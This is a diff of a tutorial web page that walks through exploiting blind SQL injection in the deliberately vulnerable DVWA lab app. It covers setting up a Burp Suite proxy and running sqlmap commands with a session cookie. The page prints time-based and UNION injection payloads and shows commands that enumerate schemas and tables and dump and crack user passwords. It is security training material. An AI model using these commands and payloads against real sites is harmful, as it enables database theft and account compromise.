@@ -1,19 +1,75 @@
- <meta name=”robots” content=”noindex,nofollow”/>
+<meta name=”robots” content=”noindex,nofollow”/>
   <a href=../index.html>Back to home</a>
 <hr/>
 <h1>Exploit DVWA Blind SQL Injection (SQLi) using SQLMap and Burp Suite</h1>
 
-<p></p>
+<p>Blind SQL injection occurs when a software application is susceptible to SQL injection attacks, but it does not reveal the outcomes of the executed SQL queries or any specific details about potential database 
+ errors in the application’s HTTP responses. In simpler terms, even though an attacker can inject malicious SQL code into the application, they won’t receive direct feedback or visible evidence of the results. 
+ This lack of feedback makes blind SQL injection more challenging for attackers; however, it still allows them to potentially exploit vulnerabilities and gain unauthorized access to the application’s database.</p>
+
+<h2>Proxy Connection</h2>
+<p>To configure a proxy with Burp Suite using the FoxyProxy extension:</p>
+<p><ol>
+ <ul>Download and install the FoxyProxy extension from the Firefox add-ons store</ul>
+ <ul>Once installed, click on the FoxyProxy icon in the Firefox browser's toolbar</ul>
+ <ul>From the menu, select "options"</ul>
+ <ul>In the FoxyProxy options, click on "Add new proxy"</ul>
+ <ul>In the "Proxy Details" window, provide the following settings:</ul>
+ <ul>Proxy IP Address: 127.0.0.1</ul>
+ <ul>Proxy Port: 8080</ul>
+ <ul>Save</ul>
+</ol></p>
+<p>To use the newly configured proxy, simply click on the FoxyProxy icon again and select the desired proxy from the list. Now your proxy is set up with Burp Suite and you can use it for intercepting and analyzing
+web traffic in FireFox. We utilize IP 127.0.0.1 with port 8080. Synchronize Burp Suite and Firefox to share the same proxy settings under the Proxy and Options tab. Consequently, when we access DVWA in Firefox, it 
+will automatically utilize Burp Suite as the proxy, allowing for seamless interaction and analysis. With the proxy connection set up, Burp Suite takes control of all local network traffic on port 8080.</p>
 
 <h2>Burp Suite</h2>
 <p><ol>
-<ul>Copy the PHPSESSID of a logged in DVWA using Burp Suite</ul>
+ <ul>Use the Firefox web browser to navigate to DVWA, log in and navigate to the "SQL Injection (Blind)" section</ul>
+ <ul>Enter the value '2' for the 'id' parameter, and then click the submit button</ul>
+ <ul>Nothing will happen in the browser. This is because Burp Suite has intercepted the GET request in the URL.</ul>
+ <ul>You won't be able to successfully submit the request until you click the "Forward" option in Burp Suite to allow the request to proceed</ul>
+ <ul>Burp Suite will then show (a.o.) the Cookie and Session identifiers (<b>Cookie: security-=low; PHPSESSID=90bfb...7138e</b>)</ul>
+<ul>Copy this information as we will use it with SQLMap</ul>
+ <ul>After clicking the "Forward" option in Burp Suite, go back to the Firefox web browser</ul>
+ <ul>After forwarding the request, we will see that the URL has changed (<b>http://192.168.1.69/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#</b>)</ul>
+ <ul>Copy the updated URL as we will use it with SQLMap too</ul>
 </ol></p>
 
 <h2>SQLMap</h2>
+<p>SQLMap can be installed with <i><b>sudo apt-get install sqlmap</b></i></p>
 <p><ol>
-  <ul><i>sqlmap -u 'http://192.168.1.69/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#' --cookie="security=low; PHPSESSID=8312ad2df71eea9d627563b4710140d0"</i></ul>
-  <ul>SQLMap will show the possible injection points:</ul>
+ <ul>paste the information we got with Burp Suite in the SQLMap command:</ul>
+  <ul><i>sqlmap -u '<b>http://192.168.1.69/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#</b>' --cookie="<b>security=low; PHPSESSID=8312ad2df71eea9d627563b4710140d0</b>"</i></ul>
+ <ul>SQLMap will check if the GET parameter 'id' is dynamic, meaning it can be manipulated</ul>
+  <ul>Actual payloads are submitted by SQLMap as it attempts to exploit the SQL injection vulnerability</ul> 
+ <ul>SQLMap will show the possible injection points:</ul>
   <ul>time-based blind -> id=2' AND (SELECT 6160 FROM (SELECT(SLEEP(5)))ztHs) AND 'PLtb'='PLtb&Submit=Submit</ul>
   <ul>UNION query -> id=2' UNION ALL SELECT CONCAT(0x7178707071,0x776b6e6d4f5047597976616b49416877515a4442597a51575553485651717474727276497546596c,0x71626a7171),NULL-- -&Submit=Submit</ul>
+ <ul>SQLMap will also show the details of the webserver, including OS, web application technology (Apache, PHP etc.) as well as the back-end DBMS (Mysql)</ul>
 </ol></p>
+
+<h2>Revealing database schemas</h2>
+<p>To utilize the default behavior and bypass any interactive prompts, you can add the <b>--batch</b> option to the end of the SQLMap command. To enumerate the available database schemas, use <b>--schema</b>:</p>
+<p><ol>
+ <ul><i>sqlmap -u '<b>http://192.168.1.69/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#</b>' --cookie="<b>security=low; PHPSESSID=8312ad2df71eea9d627563b4710140d0</b>" --batch --schema</i></ul>
+</ol></p>
+
+<h2>Enumerate dvwa tables</h2>
+<p>To retrieve the tables in the DVWA database, we can use:</p>
+<p><ol>
+ <ul><i>sqlmap -u '<b>http://192.168.1.69/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#</b>' --cookie="<b>security=low; PHPSESSID=8312ad2df71eea9d627563b4710140d0</b>" -D dvwa --tables</i></ul>
+ <ul>-D enumerates the database</ul>
+ <ul>-tables is used to enumerate the tables within the DBMS database</ul>
+ <ul>One of the tables found is the "users" table</ul>
+</ol></p>
+<h2>Enumerate the users table</h2>
+<p><ol>
+ <ul><i>sqlmap -u '<b>http://192.168.1.69/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#</b>' --cookie="<b>security=low; PHPSESSID=8312ad2df71eea9d627563b4710140d0</b>" --columns -T users --batch</i></ul>
+ <ul>From the information found we conclude we are interested in the "user" and "password" columns</ul>
+</ol></p>
+<h2>Dump Usernames and Passwords</h2>
+<p><ol>
+ <ul><i>sqlmap -u '<b>http://192.168.1.69/dvwa/vulnerabilities/sqli_blind/?id=2&Submit=Submit#</b>' --cookie="<b>security=low; PHPSESSID=8312ad2df71eea9d627563b4710140d0</b>" --dump -T users --batch</i></ul>
+</ol></p>
+<p>SQLMap will retrieve the entries from the "user" and "password" columns. It will crack the hashes using a dictionary attack and outputs the plaintext passwords.</p>
